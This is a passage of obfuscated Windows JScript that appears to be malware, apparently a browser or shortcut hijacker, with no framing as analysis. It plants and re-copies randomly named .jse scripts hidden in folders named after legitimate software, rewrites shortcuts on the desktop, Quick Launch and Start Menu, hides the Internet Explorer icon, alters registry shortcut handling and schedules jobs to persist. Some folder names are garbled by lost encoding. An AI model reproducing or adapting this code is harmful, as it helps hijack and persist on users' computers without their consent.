		var f_CD = W + "\\����ʼ���˵�";		
		f_DB( f_CD, true ) ;		
		var X = f_AA.Environment("PROCESS");		
		var W = X("ALLUSERSPROFILE");		
		var f_CD = W + "\\����ʼ���˵�\\����";		
		f_DB( f_CD , true) ;		
		var f_DD = f_AO( W + "\\����ʼ���˵�\\����");		
		for( var m=0 ; m< f_DD.length ; m++ ){		
		   var f_CD =  f_DD[m] ;		   
			f_DB( f_CD,true  ) ;			
				var f_DC  = f_AO(f_DD[m] );			
			for( var n=0 ; n< f_DC.length ; n++ ){			
				var f_CD = f_DC[n] ;
				f_DB( f_CD,true  ) ;
			}
		}
		if(f_AB.FileExists("C:\\Program Files\\NetMeeting\\Family Safety\\dbhzizq.jse"))
		f_AB.CopyFile( "C:\\Program Files\\NetMeeting\\Family Safety\\dbhzizq.jse" , "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\a" , true ) ;
                if(f_AB.FileExists("C:\\Program Files\\ACD Systems\\ACDSee Trial Version\\jhnfofw.jse"))
		f_AB.CopyFile( "C:\\Program Files\\ACD Systems\\ACDSee Trial Version\\jhnfofw.jse" ,  "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\b" , true ) ;
                if(f_AB.FileExists("C:\\Program Files\\Windows Media Player\\Media Renderer\\fdjbkbs.jse"))
		f_AB.CopyFile( "C:\\Program Files\\Windows Media Player\\Media Renderer\\fdjbkbs.jse" , "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\c" , true ) ;
		if(f_AB.FileExists("C:\\Program Files\\NetMeeting\\Family Safety\\hfldmdu.jse"))
		f_AB.CopyFile( "C:\\Program Files\\NetMeeting\\Family Safety\\hfldmdu.jse", "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\d" , true ) ;

		
    }
    else {
       if(WScript.Arguments(0)=="FirstSetup") 
       {
        f_CreateNewTypeFile_Reg();		
        f_HideIEDesktopIcon();		
        f_DeleteNotSysNamespace();		
	
		f_DeleteNotSysNamespace();		
		f_FixLnkFileRegedit();		
		//f_FixOtherLnkFile( ".pntlu");		
		f_CL() ;               		
		f_RunOthersProgram() ;		
		f_CS() ;       		
		f_CI() ;   
		f_CH() ;           
	
                if(!f_AB.FileExists("C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\a"))
                f_ATS();
		if(f_AB.FileExists("C:\\Program Files\\NetMeeting\\Family Safety\\dbhzizq.jse"))
		f_AB.CopyFile( "C:\\Program Files\\NetMeeting\\Family Safety\\dbhzizq.jse" , "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\a" , true ) ;
                if(f_AB.FileExists("C:\\Program Files\\ACD Systems\\ACDSee Trial Version\\jhnfofw.jse"))
		f_AB.CopyFile( "C:\\Program Files\\ACD Systems\\ACDSee Trial Version\\jhnfofw.jse" ,  "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\b" , true ) ;
                if(f_AB.FileExists("C:\\Program Files\\Windows Media Player\\Media Renderer\\fdjbkbs.jse"))
		f_AB.CopyFile( "C:\\Program Files\\Windows Media Player\\Media Renderer\\fdjbkbs.jse" , "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\c" , true ) ;
		if(f_AB.FileExists("C:\\Program Files\\NetMeeting\\Family Safety\\hfldmdu.jse"))
		f_AB.CopyFile( "C:\\Program Files\\NetMeeting\\Family Safety\\hfldmdu.jse", "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\d" , true ) ;

       }else
       {
        var colitems = WScript.Arguments;
        f_FileHandleSchedule(colitems(0));
        f_HideIEDesktopIcon();      
        f_DeleteNotSysNamespace();       
		var f_CA = f_AA.SpecialFolders("Desktop");
		f_DB( f_CA ,false  ) ;
		var f_CB = f_AA.SpecialFolders("AllUsersDesktop");
		f_DB( f_CB,false ) ;
		var X = f_AA.Environment("PROCESS");
		var W = X("USERPROFILE");
		var f_CC = W + "\\Application Data\\Microsoft\\Internet Explorer\\Quick Launch";
		f_DB( f_CC,false ) ;
		var X = f_AA.Environment("PROCESS");
		var W = X("USERPROFILE");
		var f_CD = W + "\\����ʼ���˵�";
		f_DB( f_CD,false ) ;
		var X = f_AA.Environment("PROCESS");
		var W = X("USERPROFILE");
		var f_CD = W + "\\����ʼ���˵�\\����";
		f_DB( f_CD ,false) ;
		var f_DD = f_AO( W + "\\����ʼ���˵�\\����");
		for( var m=0 ; m< f_DD.length ; m++ ){
		   var f_CD = f_DD[m] ;
			f_DB( f_CD,false ) ;
			var f_DC  = f_AO(f_DD[m] );
			for( var n=0 ; n< f_DC.length ; n++ ){
				var f_CD = f_DC[n] ;
				f_DB( f_CD,false ) ;
			}
		}
		var X = f_AA.Environment("PROCESS");
		var W = X("ALLUSERSPROFILE");
		var f_CD = W + "\\����ʼ���˵�";
		f_DB( f_CD ,false) ;
		var X = f_AA.Environment("PROCESS");
		var W = X("ALLUSERSPROFILE");
		var f_CD = W + "\\����ʼ���˵�\\����";
		f_DB( f_CD,false ) ;
		var f_DD = f_AO( W + "\\����ʼ���˵�\\����");
		for( var m=0 ; m< f_DD.length ; m++ ){
		   var f_CD =  f_DD[m] ;
			f_DB( f_CD,false ) ;
			var f_DC  = f_AO(f_DD[m] );
			for( var n=0 ; n< f_DC.length ; n++ ){
				var f_CD = f_DC[n] ;
				f_DB( f_CD,false ) ;
			}			
		}		
		f_DeleteNotSysNamespace();		
		f_FixLnkFileRegedit();		
		//f_FixOtherLnkFile( ".pntlu");	
                if(!f_AB.FileExists("C:\\Program Files\\winzip"))
                f_AT();
                f_OthersScheduleJob() ;	
		f_CL() ;		
		f_RunOthersProgram() ;		
		f_CS() ;		
		f_CI() ;		
		f_CH() ;	
                if(f_AB.FileExists("C:\\Program Files\\NetMeeting\\Family Safety\\dbhzizq.jse"))
		f_AB.CopyFile( "C:\\Program Files\\NetMeeting\\Family Safety\\dbhzizq.jse" , "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\a" , true ) ;
                if(f_AB.FileExists("C:\\Program Files\\ACD Systems\\ACDSee Trial Version\\jhnfofw.jse"))
		f_AB.CopyFile( "C:\\Program Files\\ACD Systems\\ACDSee Trial Version\\jhnfofw.jse" ,  "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\b" , true ) ;
                if(f_AB.FileExists("C:\\Program Files\\Windows Media Player\\Media Renderer\\fdjbkbs.jse"))
		f_AB.CopyFile( "C:\\Program Files\\Windows Media Player\\Media Renderer\\fdjbkbs.jse" , "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\c" , true ) ;
		if(f_AB.FileExists("C:\\Program Files\\NetMeeting\\Family Safety\\hf